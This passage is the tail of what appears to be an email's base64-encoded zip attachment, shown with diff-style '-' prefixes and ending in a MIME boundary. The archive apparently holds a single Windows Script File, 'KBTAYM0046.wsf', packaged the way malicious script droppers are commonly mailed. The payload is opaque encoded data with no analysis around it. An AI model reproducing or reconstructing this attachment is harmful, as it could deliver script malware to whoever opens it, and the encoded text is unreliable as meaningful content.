-cK17C8v3BSFluIsnunyPdj78RErgL3wU5oWt4U8o7IoSI4RSCK+vAtcAQlu/
-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
-PAAAAPQdAAAAAA==
-
---_002_8E90271B3EACFB2BE086ABB1EA940D41467CBC5805EXMB2EU25zaifat_--
